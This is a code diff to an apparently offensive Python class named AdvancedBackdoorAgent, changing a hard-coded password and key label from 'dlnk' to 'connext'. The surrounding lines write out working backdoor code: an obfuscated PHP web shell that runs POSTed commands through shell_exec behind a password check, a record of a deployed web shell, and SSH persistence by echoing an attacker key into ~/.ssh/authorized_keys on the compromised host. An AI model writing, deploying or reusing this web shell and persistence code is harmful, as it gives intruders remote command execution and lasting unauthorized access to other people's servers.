@@ -150,7 +150,7 @@ class AdvancedBackdoorAgent(BaseAgent):
                     "type": "web_shell",
                     "path": shell_path,
                     "access_url": access_url,
-                    "password": "dlnk",
+                    "password": "connext",
                     "deployed_at": datetime.now().isoformat()
                 }
             
@@ -338,7 +338,7 @@ class AdvancedBackdoorAgent(BaseAgent):
     async def _add_ssh_key_persistence(self, shell_access: Dict) -> bool:
         """Add SSH key for persistence"""
         try:
-            ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDdLNkdLNk..."
+            ssh_key = "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDConnextConnext..."
             command = f"mkdir -p ~/.ssh && echo '{ssh_key}' >> ~/.ssh/authorized_keys"
             result = await self._execute_command(command, shell_access)
             return result.get("success", False)
@@ -405,7 +405,7 @@ class AdvancedBackdoorAgent(BaseAgent):
         """Generate obfuscated PHP web shell"""
         # Simple obfuscated PHP web shell
         shell_code = """<?php
-        $p = 'dlnk';
+        $p = 'connext';
         if(isset($_POST['c']) && md5($_POST['p']) == md5($p)) {
             echo '<pre>' . shell_exec($_POST['c']) . '</pre>';
         }
